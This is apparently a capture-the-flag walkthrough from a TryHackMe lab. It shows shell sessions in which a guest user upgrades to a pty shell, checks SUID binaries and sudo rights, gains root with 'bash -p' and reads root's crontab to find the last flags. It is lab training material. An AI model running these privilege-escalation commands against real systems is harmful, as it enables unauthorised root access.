0 updates are security updates.


Last login: Sun Oct  6 03:02:26 2019 from 192.168.247.129
$ ls
flag96
$ ls -al
total 32
drwxr-xr-x 4 guest guest 4096 Oct  6  2019 .
drwxr-xr-x 4 root  root  4096 Oct  5  2019 ..
-rw-r--r-- 1 guest guest  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 guest guest 3771 Apr  4  2018 .bashrc
drwx------ 2 guest guest 4096 Oct  6  2019 .cache

-rw-r--r-- 1 guest guest   21 Oct  6  2019 flag96
drwx------ 3 guest guest 4096 Oct  6  2019 .gnupg
-rw-r--r-- 1 guest guest  807 Apr  4  2018 .profile
$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ cat flag96
```

linpeas
```
/usr/bin/newuidmap
/usr/bin/sudo           --->    /sudo$
/usr/bin/traceroute6.iputils
/bin/mount              --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/bash
/bin/umount             --->    BSD/Linux(08-1996)
/bin/fusermount
/bin/ping
/bin/su
```


```
bash-4.4$ sudo -l
[sudo] password for guest:
Matching Defaults entries for guest on final_destination:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User guest may run the following commands on final_destination:
    (root) /nice_try_but_wrong_path/flag97_usz5rxyulqswfvsd3k1y
bash-4.4$ sudo -u root /nice_try_but_wrong_path/flag97_usz5rxyulqswfvsd3k1y
```

```
bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# ls -al
total 56
drwx------ 5 theend theend 4096 Oct  8  2019 .
drwxr-xr-x 4 root   root   4096 Oct  5  2019 ..
-rw------- 1 theend theend  240 Oct  8  2019 .bash_history
-rw-r--r-- 1 theend theend  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 theend theend 3771 Apr  4  2018 .bashrc
drwx------ 2 theend theend 4096 Oct  5  2019 .cache
-rw-r--r-- 1 theend theend   21 Oct  6  2019 flag98
drwx------ 3 theend theend 4096 Oct  5  2019 .gnupg
-rw-r--r-- 1 root   root    994 Oct  8  2019 knock.py
-rw------- 1 theend theend   36 Oct  6  2019 .lesshst
drwxrwxr-x 3 theend theend 4096 Oct  6  2019 .local
-rw-r--r-- 1 root   root     20 Oct  6  2019 .mypass
-rw-r--r-- 1 theend theend  807 Apr  4  2018 .profile
-rw-rw-r-- 1 theend theend   66 Oct  6  2019 .selected_editor
-rw-r--r-- 1 theend theend    0 Oct  5  2019 .sudo_as_admin_successful
bash-4.4# cat flag98
```


```
bash-4.4# cat /var/spool/cron/crontabs/root
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.WgIMxz/crontab installed on Tue Oct  8 15:04:23 2019)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
#flag99: <flag>
#congratulation on getting this far. If you are stuck with flag100, let me give you a hint.
#Hint: somewhere inside tryhackme website. The flag is easy but not obvious.
#Please, do not brute force or attack the site. Just find it.
@reboot python /home/theend/knock.py
```

# flag 100
```
https://tryhackme.com/p/DesKel
```

